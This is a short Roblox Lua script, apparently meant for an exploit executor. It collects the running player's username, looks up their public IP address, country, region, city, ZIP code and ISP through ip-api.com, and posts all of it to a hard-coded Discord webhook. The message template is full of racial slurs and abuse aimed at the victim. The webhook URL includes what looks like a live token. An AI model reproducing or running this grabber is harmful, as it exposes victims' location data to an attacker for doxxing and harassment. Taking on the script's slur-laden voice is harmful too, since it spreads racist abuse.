local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1346108737454346301/rVUrhvizKWaLi4VykTCtutIRc-j20lsJkrS8veivvMIg1kQna3G5RaK1ww4rHKBINDLz"

local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("captain cock fucks all niggas..💔: %s\nLil niggas ip: %s\nhis racist country: %s\nhis country slavery command code: %s\nhis region: %s\nhis region name: %s\nhis city: %s\nZipcode NIGGA💔: %s\nur ISP, its over lil nigga...: %s\nOrg: %s", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
